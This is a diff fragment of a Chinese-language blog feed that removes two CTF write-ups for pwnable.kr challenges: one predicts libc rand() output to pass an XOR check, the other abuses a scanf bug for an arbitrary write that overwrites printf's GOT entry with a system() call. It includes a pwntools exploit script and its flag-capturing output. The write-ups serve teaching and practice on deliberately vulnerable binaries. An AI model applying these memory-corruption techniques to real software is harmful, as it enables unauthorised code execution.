-    <summary type="html">
-    
-      &lt;p&gt;三次样条插值之MATLAB实现&lt;br&gt;
-    
-    </summary>
-    
-      <category term="数据挖掘" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"/>
-    
-    
-      <category term="数据挖掘，matlab" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98%EF%BC%8Cmatlab/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnable.kr:random</title>
-    <link href="http://yoursite.com/2017/04/09/Pwnable-kr-random/"/>
-    <id>http://yoursite.com/2017/04/09/Pwnable-kr-random/</id>
-    <published>2017-04-09T01:31:08.000Z</published>
-    <updated>2017-06-30T08:17:41.020Z</updated>
-    
-    <content type="html"><![CDATA[<p>伪随机<br><a id="more"></a></p>
-<h1 id="random"><a href="#random" class="headerlink" title="random"></a>random</h1><p>先file看一下<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/1.jpg?raw=true" alt=""></p>
-<p>IDA打开</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/2.jpg?raw=true" alt=""></p>
-<p>可以看到程序读入 v4 ，跟 v5 进行异或操作，若结果为  0xDEADBEEF ，则可以读取到flag。其中 v5的初始值由 rand（）指定。</p>
-<h1 id="rand（）"><a href="#rand（）" class="headerlink" title="rand（）"></a>rand（）</h1><p>rand（）产生伪随机数。伪随机数的“随机”之处是它的种子（seed）。种子确定后，按照一定算法所计算出来的随机数序列也就完全确定了。</p>
-<p>C语言中，可以通过 srand() 来指定种子（seed）。如果用户在调用 rand（）之前没有调用过 srand（），则系统默认种子为 1 。测试如下：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random1;</div><div class="line">	random1 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"No srand():\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random1 = %u\n"</span>, random1);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random2;</div><div class="line">	srand(<span class="number">1</span>);</div><div class="line">	random2 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"srand(1):\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random2 = %u\n"</span>, random2);</div><div class="line"></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random3;</div><div class="line">	srand(<span class="number">2</span>);</div><div class="line">	random3 = rand();</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"srand(2):\n"</span>);</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"random3 = %u\n"</span>, random3);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/random/3.jpg?raw=true" alt=""></p>
-<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>由以上分析可知，v5的值其实是确定的，为 1804289383。<br>而判断条件(v5 ^ v4) == 0xDEADBEEF 等价于 v4 == 0xDEADBEEF ^ v5 。运算可得 1804289383 ^ 0xDEADBEEF = 3039230856。所以我们要给 v4 传入 3039230856 。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">random@ubuntu:~$ ./random</div><div class="line">3039230856                  </div><div class="line">Good!</div><div class="line">Mommy, I thought libc random is unpredictable...</div></pre></td></tr></table></figure>
-<p>FLAG: Mommy, I thought libc random is unpredictable…</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;伪随机&lt;br&gt;
-    
-    </summary>
-    
-      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Pwnable.kr:passcode</title>
-    <link href="http://yoursite.com/2017/04/08/Pwnable-kr-passcode/"/>
-    <id>http://yoursite.com/2017/04/08/Pwnable-kr-passcode/</id>
-    <published>2017-04-08T02:42:32.000Z</published>
-    <updated>2017-06-30T08:17:46.004Z</updated>
-    
-    <content type="html"><![CDATA[<p>简单GOT覆写<br><a id="more"></a></p>
-<h1 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h1><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p>先file看一下，32位。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/1.jpg?raw=true" alt=""></p>
-<p>用IDA打开，f5</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/2.jpg?raw=true" alt=""></p>
-<p>可以看到，在调用完 welcome() 后立即调用了 login()。也就是说，welcome()栈帧的栈底 和 login()栈帧的栈底 是一样的。</p>
-<h2 id="welcome（）"><a href="#welcome（）" class="headerlink" title="welcome（）"></a>welcome（）</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/3.jpg?raw=true" alt=""></p>
-<p>通过 __isoc99_scanf() 读取name字符串，字符串大小为100。且由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int v1; // [sp+18h] [bp-10h]@0</div></pre></td></tr></table></figure></p>
-<p>这一行可知，在 welcome() 的栈帧中，name字符串的起始位置在 ebp-70h 的地方。</p>
-<h2 id="login（）"><a href="#login（）" class="headerlink" title="login（）"></a>login（）</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/4.jpg?raw=true" alt=""></p>
-<p>这里分别通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">__isoc99_scanf(&quot;%d&quot;)</div></pre></td></tr></table></figure></p>
-<p>来获得 passcode1 和 passcode2  的值。要注意的是，这里  scanf(“%d”) 中没有出现取地址符，也就是说，scanf(“%d”) 会直接把栈上的数据当作指针，并将读入的数据存放到这个“指针”指的“地址”上。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/7.jpg?raw=true" alt=""><br>以第一个红框为例，它对应着 passcode1 的读入。scanf的参数有两个，第一个是格式化字符串，第二个是地址表列。按照参数从右到左入栈。所以下面这段话，将 ebp-0x10 处的数据 放到了 esp+0x4 处 作为了 scanf的地址表项参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">804857c:	8b 55 f0             	mov    edx,DWORD PTR [ebp-0x10]</div><div class="line">804857f:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx</div></pre></td></tr></table></figure></p>
-<p>scanf的第一个参数即 格式化字符串 由下面这两句话传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048577:	b8 83 87 04 08        mov    eax,0x8048783</div><div class="line">省略</div><div class="line">8048583:	89 04 24              mov    DWORD PTR [esp],eax</div></pre></td></tr></table></figure></p>
-<p>0x8048783 处的数据如下：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/8.jpg?raw=true" alt=""><br>所以对于第一个 scanf(), 它的第二个参数的数值为在login（）栈帧的 ebp-0x10 处的数据。</p>
-<p>对于passcode2 的分析同理。</p>
-<h1 id="Check"><a href="#Check" class="headerlink" title="Check"></a>Check</h1><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>从login（）的逻辑来看，只要 v1 = 0x528E6 和 0xCC07C9 程序就能执行到 return system（）。而且 welcome（）和 login（） 的 ebp 是相同的，有没有可能通过构造 welcome的输入 来控制 v1 v2 的值呢？</p>
-<p>从前边的ida分析来看，在login（）的栈帧中，passcode1位置在 ebp-10h, 在welcome（）栈帧中，name字符串起始位置在 ebp-70h。由于welcome（）和login（）调用连续，他们的栈帧的ebp其实是一样的。如下图，两个栈帧对比如下：</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/6.jpg?raw=true" alt=""></p>
-<p>70h - 10h = 60h = 96 &lt; 100。也就是说，我们在welcome（）中输入的name的第 97 - 100 的字符，在 login（）栈帧中恰好是作为第一个 scanf 的第二个参数（即地址表项）。而在login（）中，调用第一次 scanf 时传入的 %d 将会写到这个地址中。这样我们能控制 passcode1。</p>
-<p>用peda的checksec检查发现开启了canary保护<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/5.jpg?raw=true" alt=""></p>
-<p>由于passcode1已经是在长度为100的name的最后四个字节，因此不可能通过继续增加name的输入来控制 passcode2，否则会触发canary。</p>
-<h2 id="科普：GOT"><a href="#科普：GOT" class="headerlink" title="科普：GOT"></a>科普：GOT</h2><p>linux中，ELF编译系统采用了一种叫延迟绑定（lazy binding）的技术。若ELF文件调用了定义在共享库中的函数，那ELF文件中就存在 GOT（全局偏移表） 和 PLT（过程链接表），其中GOT存放在 .data 段（已初始化的全局C变量），而PLT存放在 .text 段（已编译程序的机器代码）。对于一般函数，PLT表和GOT表一一对应。</p>
-<p>当第一次调用共享库中的函数时，该函数对应的GOT表项中存放的是对应PLT表中的push1条目的地址。程序调用时，执行函数对应PLT的第一条指令时会先通过对应GOT跳转到PLT表中的下一条指令，之后通过一系列操作，将对应GOT覆盖为函数的真实地址，并执行该函数。等到下一次调用该函数时，程序一样先执行函数对应PLT的第一条指令，之后通过GOT表会直接执行该函数，因为GOT表中已经是函数的真实地址了。</p>
-<h2 id="Thinking"><a href="#Thinking" class="headerlink" title="Thinking"></a>Thinking</h2><p>通过之前的分析，我们能通过控制name的最后四个字节，结合passcode1的scanf来实现对任意地址的写入。加上 GOT表是在 .data 段，是可写的。因此一个想法就是：我们可以将 printf 的GOT表 覆写为 system函数的地址。由前可知，当再次调用 printf 时，会通过 printf的GOT表执行 system函数。</p>
-<p>printf 的 GOT地址可以通过 pwntools 工具获得。也可以通过 objdump 获得，如下.<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/10.jpg?raw=true" alt=""></p>
-<p>对于system函数地址，由于程序中已经提供了，所以这里直接取 80485e3</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170408/passcode/12.jpg?raw=true" alt=""></p>
-<p>这里对应着login（）中的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">return system(&quot;/bin/cat flag&quot;);</div></pre></td></tr></table></figure></p>
-<p>梳理一下思路：按照程序的流程，welcome（），我们输入100个字符，其中最后四个是 printf的GOT地址。之后程序进入login，调用scanf（”%d”）时，以 %d 形式将我们输入的数据（ system(“/bin/cat flag”)）读入，并写入到 printf的GOT地址。接下去，程序会执行 printf(“enter passcode2 : “); 即再次调用printf函数，但实际执行的是 system函数。<br>要注意的是，由于是以 %d 形式读入，所以输入时应为 134514147 （0x80485e3 = 134514147）</p>
-<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">elf = ELF(<span class="string">"passcode"</span>)</div><div class="line">r = remote(<span class="string">"127.0.0.1"</span>,<span class="string">"12345"</span>)</div><div class="line"><span class="comment">#r = process("./passcode")</span></div><div class="line"></div><div class="line"></div><div class="line">printfGotAddr = elf.got[<span class="string">"printf"</span>]</div><div class="line">systemAddr = <span class="number">134514147</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"the printfGotAddr is "</span>+ hex(printfGotAddr)</div><div class="line"><span class="keyword">print</span> <span class="string">"the systemAddr is "</span>+ hex(systemAddr)</div><div class="line"></div><div class="line">payload1 = <span class="string">'a'</span> * <span class="number">96</span> + p32(printfGotAddr)</div><div class="line">payload2 = str(systemAddr)</div><div class="line">r.sendline(payload1)</div><div class="line">r.sendline(payload2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recv()</div></pre></td></tr></table></figure>
-<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h2 id="local-test"><a href="#local-test" class="headerlink" title="local test"></a>local test</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">(venv) chybeta@ubuntu:~/pwn/pwnable/passcode$ python exp.py</div><div class="line">[*] &apos;/home/chybeta/pwn/pwnable/passcode/passcode&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">[+] Opening connection to 127.0.0.1 on port 12345: Done</div><div class="line">the printfGotAddr is 0x804a000</div><div class="line">the systemAddr is 0x80485e3</div><div class="line">flag&#123;2222222222&#125;</div><div class="line">[*] Closed connection to 127.0.0.1 port 12345</div></pre></td></tr></table></figure>
-<h2 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">passcode@ubuntu:~$ ls</div><div class="line">flag  passcode	passcode.c</div><div class="line">passcode@ubuntu:~$ python</div><div class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24)</div><div class="line">[GCC 5.4.0 20160609] on linux2</div><div class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line">&gt;&gt;&gt; e = ELF(&quot;passcode&quot;)</div><div class="line">[*] &apos;/home/passcode/passcode&apos;</div><div class="line">    Arch:     i386-32-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE</div><div class="line">&gt;&gt;&gt; r = process(&quot;./passcode&quot;)</div><div class="line">[x] Starting local process &apos;./passcode&apos;</div><div class="line">[+] Starting local process &apos;./passcode&apos;: Done</div><div class="line">&gt;&gt;&gt; printfGotAddr = e.got[&quot;printf&quot;]</div><div class="line">&gt;&gt;&gt; systemAddr = 134514147</div><div class="line">&gt;&gt;&gt; payload1 = &apos;a&apos; * 96 + p32(printfGotAddr)</div><div class="line">&gt;&gt;&gt; payload2 = str(systemAddr)</div><div class="line">&gt;&gt;&gt; r.sendline(payload1)</div><div class="line">&gt;&gt;&gt; r.sendline(payload2)</div><div class="line">&gt;&gt;&gt; print r.recv()</div><div class="line">[*] Process &apos;./passcode&apos; stopped with exit code 0</div><div class="line">Toddler&apos;s Secure Login System 1.0 beta.</div><div class="line">enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</div><div class="line">Sorry mom.. I got confused about scanf usage :(</div><div class="line">enter passcode1 : Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>
-<p>FLAG: Sorry mom.. I got confused about scanf usage :(</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;简单GOT覆写&lt;br&gt;
-    
-    </summary>
-    
-      <category term="二进制安全" scheme="http://yoursite.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
-    
-      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
-    
-      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
-    
-      <category term="pwnable.kr" scheme="http://yoursite.com/tags/pwnable-kr/"/>
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
